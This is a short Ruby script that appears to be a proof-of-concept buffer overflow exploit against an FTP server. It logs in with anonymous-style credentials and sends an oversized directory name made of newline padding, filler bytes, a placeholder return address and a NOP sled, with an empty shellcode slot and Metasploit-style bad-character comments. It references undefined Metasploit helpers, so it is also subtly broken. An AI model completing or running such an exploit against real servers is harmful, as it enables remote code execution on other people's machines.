#!/usr/bin/ruby

require 'net/ftp'
require 'socket'

# 'BadChars' => "\x00\x20\x0a\x0d"
# 'Space'    => 250
# 'EXITFUNC' => 'process'

username = "ftp"
passwd = "ftp"
URL = "192.168.21.111"

payload = ""

nops = "\x90" * 40

ret = 0x99999999

#connect_login
ftp=Net::FTP.new
ftp.connect(URL,21)
ftp.login(username,passwd)

sploit =  "\n" * 671 + "\x41\x41\x41"
sploit << [ret].pack('V') + nops + payload
print_status("Trying target #{target.name}...")
ftp.mkdir(sploit)

#disconnect
ftp.close